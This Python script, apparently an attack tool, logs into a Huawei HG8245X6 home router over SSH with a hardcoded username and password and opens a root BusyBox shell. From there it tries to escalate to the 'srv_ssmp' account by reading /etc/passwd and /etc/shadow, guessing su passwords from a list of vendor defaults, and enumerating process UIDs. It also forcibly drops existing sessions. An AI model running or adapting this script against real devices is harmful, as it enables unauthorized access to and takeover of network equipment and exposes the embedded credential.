#!/usr/bin/env python3
"""
Attempt to escalate to srv_ssmp (highest privilege user) on Huawei HG8245X6.
"""

import paramiko
import time

HOST = "192.168.1.1"
USER = "sUser"
PASSWORD = "EP!99R4HLH9E"

def recv_until(chan, markers, timeout=10):
    if isinstance(markers, str):
        markers = [markers]
    buf = b""
    start = time.time()
    while time.time() - start < timeout:
        if chan.recv_ready():
            chunk = chan.recv(4096)
            buf += chunk
            decoded = buf.decode('utf-8', errors='replace')
            for marker in markers:
                if marker in decoded:
                    return decoded
        elif chan.exit_status_ready():
            break
        time.sleep(0.1)
    return buf.decode('utf-8', errors='replace')

def send_cmd(chan, cmd, marker="# ", timeout=15):
    chan.send(cmd + "\n")
    out = recv_until(chan, [marker, "WAP>", "SU_WAP>", "$ ", "# "], timeout)
    lines = [l.strip() for l in out.strip().split('\n') if l.strip()]
    # Print response, skipping the echo of the command itself
    for l in lines:
        if cmd[:30] not in l:
            print(f"  {l}")
    return out

def connect_and_shell():
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(HOST, username=USER, password=PASSWORD, timeout=10,
                   look_for_keys=False, allow_agent=False)
    chan = client.invoke_shell(width=220, height=50)
    time.sleep(2)

    out = recv_until(chan, ["WAP>", "Remove one session", "Enter the ID"], timeout=8)
    if "Remove one session" in out or "Enter the ID" in out:
        print("[!] Session limit hit - removing existing session 1...")
        chan.send("1\n")
        time.sleep(2)
        recv_until(chan, "WAP>", timeout=10)

    chan.send("su\n")
    recv_until(chan, ["SU_WAP>", "success"], timeout=8)
    chan.send("shell\n")
    recv_until(chan, "# ", timeout=8)
    print("[+] BusyBox shell obtained!\n")
    return client, chan

def main():
    print("=" * 60)
    print(" Huawei HG8245X6 - srv_ssmp Privilege Escalation")
    print("=" * 60)

    client, chan = connect_and_shell()

    # ── 1. Who are we right now? ──────────────────────────────
    print("\n[*] Current identity:")
    send_cmd(chan, "id")
    send_cmd(chan, "whoami")

    # ── 2. Enumerate all system users ────────────────────────
    print("\n[*] All users in /etc/passwd:")
    send_cmd(chan, "cat /etc/passwd", timeout=5)

    # ── 3. Look for srv_ssmp details ─────────────────────────
    print("\n[*] srv_ssmp entry:")
    send_cmd(chan, "grep srv_ssmp /etc/passwd /etc/shadow 2>/dev/null")

    # ── 4. Check running srv_ssmp processes ───────────────────
    print("\n[*] Processes owned by srv_ssmp:")
    send_cmd(chan, "ps | grep -v grep | head -40")

    # ── 5. Try 'su srv_ssmp' with blank / common passwords ───
    print("\n[*] Attempting 'su srv_ssmp' (blank password)...")
    chan.send("su srv_ssmp\n")
    out = recv_until(chan, ["Password", "$ ", "# ", "ssmp"], timeout=5)
    print(f"  {out.strip()}")

    if "Password" in out or "password" in out:
        print("  [*] Password prompt appeared - trying blank password...")
        chan.send("\n")
        out = recv_until(chan, ["$ ", "# ", "incorrect", "failure", "WAP"], timeout=5)
        print(f"  {out.strip()}")

        if "incorrect" in out.lower() or "failure" in out.lower():
            print("  [-] Blank password failed.")
            # Try common passwords
            for pwd in ["admin", "huawei", "root", "ssmp", "srv_ssmp", "telecomadmin", "superonline"]:
                print(f"  [*] Trying password: {pwd}")
                chan.send(f"su srv_ssmp\n")
                recv_until(chan, "Password", timeout=5)
                chan.send(f"{pwd}\n")
                out = recv_until(chan, ["$ ", "# ", "incorrect", "failure", "WAP"], timeout=5)
                if "incorrect" not in out.lower() and "failure" not in out.lower():
                    print(f"  [+] SUCCESS with password: {pwd}")
                    break
                print(f"  [-] {pwd} failed")
        else:
            print("  [+] No password needed or success!")
    else:
        print(f"  [*] Unexpected response: {out.strip()}")

    # ── 6. Look for SSMP config/keys ─────────────────────────
    print("\n[*] srv_ssmp home directory and files:")
    send_cmd(chan, "ls -la /home/srv_ssmp/ 2>/dev/null || echo 'no home dir'")
    send_cmd(chan, "ls -la /var/ssmp/ 2>/dev/null || echo 'no /var/ssmp'")

    # ── 7. Check smp-related binaries ─────────────────────────
    print("\n[*] SSMP-related binaries:")
    send_cmd(chan, "ls -la /bin/*ssmp* /bin/*smp* /usr/bin/*ssmp* 2>/dev/null")

    # ── 8. Check if SU from shell can switch user ─────────────
    print("\n[*] Trying exec as srv_ssmp via env/nsenter tricks:")
    send_cmd(chan, "grep srv_ssmp /etc/passwd | cut -d: -f3,4", timeout=5)

    # ── 9. Check /proc for srv_ssmp PID ───────────────────────
    print("\n[*] Finding srv_ssmp PID from /proc:")
    send_cmd(chan, "for p in /proc/[0-9]*/status; do grep -l 'srv_ssmp' $p 2>/dev/null; done | head -5", timeout=10)
    send_cmd(chan, "cat /proc/$(ls /proc | grep -E '^[0-9]+$' | head -1)/status 2>/dev/null | grep -E 'Name|Uid|Gid' | head -6", timeout=5)

    # ── 10. List all PIDs with their UIDs from status ─────────
    print("\n[*] All process UIDs (looking for srv_ssmp):")
    send_cmd(chan, "for pid in $(ls /proc | grep -E '^[0-9]+$'); do uid=$(cat /proc/$pid/status 2>/dev/null | grep '^Uid' | awk '{print $2}'); name=$(cat /proc/$pid/status 2>/dev/null | grep '^Name' | awk '{print $2}'); [ -n \"$uid\" ] && echo \"PID=$pid UID=$uid NAME=$name\"; done | head -30", timeout=20)

    # ── 11. Check ssmp_kv or ssmp process ────────────────────
    print("\n[*] ssmp process map:")
    send_cmd(chan, "ps -ef 2>/dev/null | head -40 || ps aux 2>/dev/null | head -40")

    client.close()
    print("\n[*] Session closed.")

if __name__ == "__main__":
    main()
